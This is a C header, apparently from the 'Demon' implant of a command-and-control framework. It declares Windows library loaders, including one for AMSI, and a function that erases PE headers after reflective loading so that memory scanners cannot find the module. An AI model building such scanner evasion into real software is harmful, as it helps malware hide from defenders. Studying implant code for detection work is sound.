#ifndef DEMON_RUNTIME_H
#define DEMON_RUNTIME_H

#include <windows.h>

BOOL RtAdvapi32(
    VOID
);

BOOL RtMscoree(
    VOID
);

BOOL RtOleaut32(
    VOID
);

BOOL RtUser32(
    VOID
);

BOOL RtShell32(
    VOID
);

BOOL RtMsvcrt(
    VOID
);

BOOL RtIphlpapi(
    VOID
);

BOOL RtGdi32(
    VOID
);

BOOL RtNetApi32(
    VOID
);

BOOL RtWs2_32(
    VOID
);

BOOL RtSspicli(
    VOID
);

BOOL RtAmsi(
    VOID
);

#ifdef TRANSPORT_HTTP
BOOL RtWinHttp(
    VOID
);
#endif

/*!
 * ARC-07: Zero the MZ/DOS/PE signatures at the module's base address.
 *
 * After the reflective loader has resolved all imports and relocations the
 * PE headers are no longer needed but remain a reliable detection artefact
 * for memory scanners.  This function makes the first page writable, zeros
 * the DOS header (MZ), the DOS stub, and the PE signature (PE\0\0), then
 * restores PAGE_EXECUTE_READ.
 *
 * Instance->Session.ModuleBase must be set before calling this function.
 *
 * @return STATUS_SUCCESS on success, or an NTSTATUS error code.
 */
NTSTATUS RtStompPeHeader(
    VOID
);

#endif